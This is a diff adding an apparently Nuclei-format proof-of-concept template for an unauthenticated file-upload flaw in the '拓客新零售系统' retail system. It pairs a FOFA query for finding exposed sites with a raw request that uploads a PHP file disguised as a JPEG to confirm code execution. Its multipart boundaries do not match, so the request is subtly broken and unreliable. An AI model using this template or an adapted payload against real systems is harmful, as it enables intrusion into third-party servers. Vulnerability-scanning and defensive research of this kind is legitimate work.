@@ -1,0 +1,34 @@
+id: tuoke-retail-shangchuan-upload
+
+info:
+  name: 拓客新零售系统 shangchuan 接口未授权文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa:"/Public/Xin/static/css/iconfont.css"
+          拓客新零售系统为商家提供订单自动匹配及营销推送功能，支持全自动化操作。该系统存在文件上传接口权限控制缺陷，攻击者可利用此漏洞上传恶意文件，进而实现远程代码执行或数据篡改。
+  tags: 拓客新零售系统
+
+http:
+- raw:
+  - |
+    POST /Login/shangchuan HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg
+    Connection: keep-alive
+
+    ------WebKitFormBoundary03rNBzFMIytvpWh
+    Content-Disposition: form-data; name="file"; filename="NTest.php"
+    Content-Type: image/jpeg
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
